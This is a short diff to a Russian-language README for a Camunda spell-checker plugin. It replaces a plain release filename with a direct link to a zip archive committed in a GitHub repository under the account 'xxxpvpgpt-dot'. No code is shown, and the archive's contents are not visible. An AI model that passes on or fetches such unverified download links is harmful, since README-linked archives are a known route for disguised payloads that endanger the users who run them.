@@ -8,8 +8,7 @@
 
 Готовая сборка хранится в каталоге `releases/`.
 ## Свежая версия
-camunda-russian-spell-checker-v0.6.28.zip
-
+[Camunda-russian-spell-checker-v0.6.28.zip](https://github.com/xxxpvpgpt-dot/camunda-russian-spell-checker/blob/54cd40228c4c400f26362cf8a244080dcb9090fe/camunda-russian-spell-checker-v0.6.28.zip)
 
 ## Политика стабильных версий
 
